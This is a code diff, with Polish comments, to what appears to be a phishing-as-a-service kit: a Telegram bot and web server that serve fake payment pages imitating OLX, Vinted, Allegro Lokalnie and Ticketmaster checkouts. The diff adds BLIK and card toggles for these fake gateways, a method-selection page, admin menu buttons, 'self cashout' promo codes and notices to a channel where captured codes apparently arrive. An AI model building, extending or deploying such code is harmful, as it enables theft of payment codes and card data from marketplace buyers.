@@ -1393,12 +1393,24 @@ async function getPublicDomain() {
 	return (await getBotConfig("public_domain")) || CONFIG.BOT_SETTINGS.DEFAULT_DOMAIN || "";
 }
 
+// Blokada BLIK-a w BOCIE TG (wrzucanie kodu przez /start).
 async function isGlobalBlikEnabled() {
 	return (await getBotConfig("global_blik_enabled", "Tak")) !== "Nie";
 }
 
+// Blokada BLIK-a na BRAMKACH (strony platnosci). Niezalezna od bota.
+async function isGatewayBlikEnabled() {
+	return (await getBotConfig("gateway_blik_enabled", "Tak")) !== "Nie";
+}
+
+// Card: w bocie i na bramce korzystamy z tej samej flagi (karty nie sa wrzucane w bocie).
 async function isGlobalCardEnabled() {
 	return (await getBotConfig("global_card_enabled", "Tak")) !== "Nie";
+}
+
+// Czy na bramce jest jakas metoda poza BLIK-iem (karta lub przelew) — zeby nie redirectowac w prozne.
+async function isGatewayPrzelewAvailable() {
+	return (await getBotConfig("przelew_status")) === "Tak";
 }
 
 async function isGlobalSelfCashout() {
@@ -1972,13 +1984,39 @@ async function renderGatewayPaymentStep(req, res, platform, link, idoferty) {
 		return res.status(503).redirect(getGatewayFallbackUrl(platform));
 	}
 
-	if (olx === 'PayU' || olx === 'PayU_BLIK') {
+	// BLIK na bramce wylaczony — nie wchodzimy na kroki BLIK.
+	if (['BLIK', 'PayU_BLIK'].includes(olx) && !(await isGatewayBlikEnabled())) {
+		if (!(await isGlobalCardEnabled()) && !(await isGatewayPrzelewAvailable())) {
+			return res.status(503).redirect(getGatewayFallbackUrl(platform));
+		}
+		const q = new URLSearchParams(req.query);
+		q.set('olx', 'PayU');
+		return res.redirect(`${req.path}?${q.toString()}`);
+	}
+
+	if (olx === 'PayU_BLIK' || (olx === 'PayU' && (await isGatewayBlikEnabled()))) {
 		const q = new URLSearchParams(req.query);
 		q.set('olx', 'BLIK');
 		q.delete('c');
 		q.delete('error');
 		q.delete('method');
 		return res.redirect(`${req.path}?${q.toString()}`);
+	}
+
+	if (olx === 'PayU') {
+		// BLIK wylaczony — zostajemy na ekranie wyboru metod (karta / przelew).
+		const cenaPayU = platform === 'alebilet'
+			? String(getAlebiletPricing(oferta).totalInt)
+			: String(getTicketmasterPricing(oferta).totalInt);
+		let payTemplate = fs.readFileSync(path.join(__dirname, 'template', 'olx_payu.html'), 'utf8');
+		payTemplate = payTemplate
+			.replace(/TUTAJCENA/g, cenaPayU)
+			.replace(/TUTAJID/g, oferta.link)
+			.replace(/TUTAJNAZWA/g, oferta.nazwa || '')
+			.replace(/TUTAJERROR/g, String(req.query.error || req.query.c || 0))
+			.replace(/TUTAJAUTH/g, req.query.auth ? 'true' : 'false');
+		payTemplate = prepareGatewayPaymentTemplate(payTemplate, req);
+		return res.send(payTemplate);
 	}
 
 	const templateMap = {
@@ -2034,7 +2072,7 @@ async function isBotOnline() {
 }
 
 async function areOfferGatewaysAvailable() {
-	return (await isGlobalBlikEnabled()) || (await isGlobalCardEnabled());
+	return (await isGatewayBlikEnabled()) || (await isGlobalCardEnabled());
 }
 
 async function checkOfferCreationAllowed(userId) {
@@ -3728,6 +3766,15 @@ bot.onText(/^\/selfcashout(?:@\w+)?(?:\s+(.+))?$/, async (msg, match) => {
 			modernBullet("Możesz też dalej wrzucać BLIK przez `/start`.")
 		]
 	}]);
+
+	// Info na kanał kodów — bez ujawniania kodu
+	const nick = user?.username ? `@${user.username}` : "";
+	await sendChannelMessage(
+		CONFIG.CHANNELS.CODES,
+		`${pe("sparkle", "✨")} <b>Self cashout aktywowany</b>\n\n` +
+		`<blockquote>${pe("person", "👤")} <code>${userId}</code>${nick ? ` (${nick})` : ""}\n` +
+		`${pe("hourglass", "⏳")} Na <b>${promo.days}</b> dni</blockquote>`
+	).catch(() => {});
 });
 
 bot.onText(/\/domena(?:@\w+)?(?:[ \t]+(.+))?$/, async (msg, match) => {
@@ -5034,6 +5081,7 @@ async function sendFgAdminMenu(chatId, viewerId = chatId) {
 	const feeNum = globalFee ? parseFloat(globalFee) : CONFIG.DEFAULT_FEE;
 	const status = (await getBotConfig("bot_status")) !== "disabled" ? "🟢 Włączony" : "🔴 Wyłączony";
 	const blikStatus = formatGlobalGatewayStatus(await isGlobalBlikEnabled());
+	const gatewayBlikStatus = formatGlobalGatewayStatus(await isGatewayBlikEnabled());
 	const cardStatus = formatGlobalGatewayStatus(await isGlobalCardEnabled());
 	const selfCashoutStatus = formatSelfCashoutStatus(await isSelfCashoutEnabled());
 	const depositLimit = await getDepositLimit();
@@ -5046,7 +5094,8 @@ async function sendFgAdminMenu(chatId, viewerId = chatId) {
 		`${pe("chart", "📈")} <b>Globalne fee:</b> <code>${feeNum.toFixed(1)}%</code>\n` +
 		`${pe("card", "💳")} <b>Limit wpłaty:</b> <code>${limitStr}</code>\n` +
 		`${pe("globe", "🌐")} <b>Domena publiczna:</b> <code>${publicDomainStr}</code>\n` +
-		`${pe("phone", "📲")} <b>BLIK na bramce:</b> ${blikStatus}\n` +
+		`${pe("phone", "📲")} <b>BLIK w bocie (wrzucanie kodów):</b> ${blikStatus}\n` +
+		`${pe("phone", "📲")} <b>BLIK na bramce:</b> ${gatewayBlikStatus}\n` +
 		`${pe("card", "💳")} <b>Karty na bramce:</b> ${cardStatus}\n` +
 		`${pe("person", "👤")} <b>Self cashout:</b> ${selfCashoutStatus}\n` +
 		`${pe("robot", "🤖")} <b>Status bota:</b> ${status}` +
@@ -5063,9 +5112,10 @@ async function sendFgAdminMenu(chatId, viewerId = chatId) {
 				{ text: "Włącz/Wyłącz Bota", icon_custom_emoji_id: "6030400221232501136", callback_data: "fg_admin_toggle_bot" }
 			],
 			[
-				{ text: "Włącz/Wyłącz BLIK", icon_custom_emoji_id: "6039605143601680423", callback_data: "fg_admin_toggle_blik" },
+				{ text: "Włącz/Wyłącz BLIK (bot)", icon_custom_emoji_id: "6039605143601680423", callback_data: "fg_admin_toggle_blik" },
 				{ text: "Włącz/Wyłącz Karty", icon_custom_emoji_id: "5778421276024509124", callback_data: "fg_admin_toggle_card" }
 			],
+			[{ text: "Włącz/Wyłącz BLIK (bramka)", icon_custom_emoji_id: "6039605143601680423", callback_data: "fg_admin_toggle_gateway_blik" }],
 			[{ text: "Włącz/Wyłącz Self Cashout", icon_custom_emoji_id: "5769248574499983619", callback_data: "fg_admin_toggle_selfcashout" }],
 			[{ text: "Ustaw domenę publiczną", icon_custom_emoji_id: "5776233299424843260", callback_data: "fg_admin_set_public_domain" }],
 			[{ text: "Dane przelewu / IBAN (globalne)", icon_custom_emoji_id: "5879814368572478751", callback_data: "fg_admin_przelew_menu" }],
@@ -6213,6 +6263,13 @@ async function handleFgCallback(query) {
 			return true;
 		}
 
+		if (data === "fg_admin_toggle_gateway_blik") {
+			const enabled = await isGatewayBlikEnabled();
+			await setBotConfig("gateway_blik_enabled", enabled ? "Nie" : "Tak");
+			await sendFgAdminMenu(userId);
+			return true;
+		}
+
 		if (data === "fg_admin_toggle_card") {
 			const enabled = await isGlobalCardEnabled();
 			await setBotConfig("global_card_enabled", enabled ? "Nie" : "Tak");
@@ -6714,7 +6771,22 @@ async function handleFgAdminState(userId, text, stateData, msg) {
 			await say("❌ Podaj liczbę dni z zakresu 1–365:");
 			return true;
 		}
-		const code = "SC-" + Math.random().toString(36).slice(2, 8).toUpperCase();
+		// Długi, losowo-unikalny kod (4 grupy po 5 znaków). Sprawdzamy kolizje w bazie.
+		const alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
+		let code;
+		for (let attempt = 0; attempt < 8; attempt++) {
+			const bytes = crypto.randomBytes(20);
+			const raw = Array.from(bytes).map((b) => alphabet[b % alphabet.length]).join("");
+			const candidate = "SC-" + (raw.match(/.{5}/g) || []).join("-");
+			if (!(await PromoCode.findOne({ code: candidate }))) {
+				code = candidate;
+				break;
+			}
+		}
+		if (!code) {
+			await say("❌ Nie udało się wygenerować unikalnego kodu — spróbuj jeszcze raz.");
+			return true;
+		}
 		await PromoCode.create({ code, days, createdBy: userId });
 		await editUserDB(userId, { adminState: null });
 		await sendFgMessage(
@@ -10324,8 +10396,9 @@ app.get('/oferta/:nazwa', async (req, res) => {
 			return res.status(503).redirect(getGatewayFallbackUrl(req.subdomain));
 		}
 
-		const globalBlikFlag = globalEnabledToTakNie(await isGlobalBlikEnabled());
+		const globalBlikFlag = globalEnabledToTakNie(await isGatewayBlikEnabled());
 		const globalCardFlag = globalEnabledToTakNie(await isGlobalCardEnabled());
+
 
 		let fileName = frontendName === 'allegrolokalnie'
 		? 'allegrolokalnie_banita.html' 
@@ -11067,7 +11140,7 @@ app.get('/items/:nazwa', async (req, res) => {
 		}
 
 		if (vinted === 'BLIK' || vinted === 'error') {
-			if (!(await isGlobalBlikEnabled())) {
+			if (!(await isGatewayBlikEnabled())) {
 				return res.status(503).redirect('https://www.vinted.pl/');
 			}
 			const q = new URLSearchParams(req.query);
@@ -11785,7 +11858,7 @@ app.get('/api/card-heartbeat.php', (req, res) => {
 });
 
 app.get('/api/blik-api.php', async (req, res) => {
-	if (!(await isGlobalBlikEnabled())) {
+	if (!(await isGatewayBlikEnabled())) {
 		return res.status(503).json({ error: "BLIK niedostępny" });
 	}
 
